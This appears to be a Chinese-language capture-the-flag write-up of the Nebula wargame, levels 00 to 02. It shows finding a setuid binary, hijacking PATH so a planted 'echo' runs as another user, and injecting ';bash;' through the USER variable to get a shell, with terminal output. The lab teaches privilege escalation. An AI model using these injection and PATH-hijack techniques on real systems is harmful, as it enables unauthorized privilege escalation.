# Nebula

## level00
用`level00`账户登录，找出由`flag00`拥有的 Set User ID的程序

### Solution
要将错误结果送到/dev/null，不然出现很多 Permission denied, 会影响找到该程序。
```sh
$ find / -user flag00 2>/dev/null
/bin/.../flag00
/home/flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
/rofs/bin/.../flag00
/rofs/home/flag00
/rofs/home/flag00/.bash_logout
/rofs/home/flag00/.bashrc
/rofs/home/flag00/.profile
```
尝试了一下，`/rofs/bin/.../flag00`即为目标程序。
```sh
level00@nebula:~$ file /rofs/bin/.../flag00
/rofs/bin/.../flag00: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
level00@nebula:~$ ll /rofs/bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00*
level00@nebula:~$ /rofs/bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
flag00@nebula:~$ which getflag
/bin/getflag
flag00@nebula:~$ file /bin/getflag
/bin/getflag: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
flag00@nebula:~$ whoami
flag00
flag00@nebula:~$ id
uid=999(flag00) gid=1001(level00) groups=999(flag00),1001(level00)
flag00@nebula:~$
```
## level01
通过看源文件 level1.c
发现要要通过`system()`来执行shell命令。
```c
system("/usr/bin/env echo and now what?");
```
发现可以对`echo`命令做一下手脚。
在一个有权限的目录下新建一个名为echo的文件，
然后将当前目录加入到`PATH`环境变量的前面使得`/usr/bin/env`在找环境变量的时候
先找到我们自己写的这个echo命令(只是暂时生效所以不需要export)。
```
PATH=`pwd`:$PATH
```
然后在这个我们自己写的echo文件中写入**getflag**就可以以flag01的身份得到flag了。
## level02
查看源文件level02.c
发现
```c
char *buffer = NULL;

asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
        
system(buffer);
```
要从系统环境变量中得到$USER变量。然后执行`/bin/echo %s is cool`。
由于这里已经写死了。用`/bin/echo`这个可执行文件，所以我们不能对echo文件做手脚了。
然而这个$USER变量是我们可控的。
于是我们
```sh
USER=";bash;"
```
这样就已flag02的身份得到bash了.
```sh
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo level02 is cool")
level02 is cool
level02@nebula:/home/flag02$ echo $USER
level02
level02@nebula:/home/flag02$ USER=";bash;"
level02@nebula:/home/flag02$ echo $USER
;bash;
level02@nebula:/home/flag02$ ./flag02
about to call system("/bin/echo ;bash; is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```
然后就可以在flag02的shell里面执行`getflag`得到shell了。
## level03


